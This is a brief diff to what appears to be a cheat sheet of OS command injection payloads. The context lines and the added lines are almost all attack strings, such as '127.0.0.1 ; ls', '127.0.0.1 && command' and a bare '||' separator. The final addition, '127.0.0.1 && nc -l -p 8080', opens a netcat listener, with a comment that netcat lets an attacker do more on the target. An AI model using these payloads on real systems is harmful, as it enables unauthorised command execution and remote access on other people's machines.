@@ -10,3 +10,8 @@ echo Injected| #perl
 127.0.0.1 ; ls #any command here
 #also try
 127.0.0.1 && command
+
+||  #
+
+#is nc on the system? stuff can be done with that
+127.0.0.1 && nc -l -p 8080
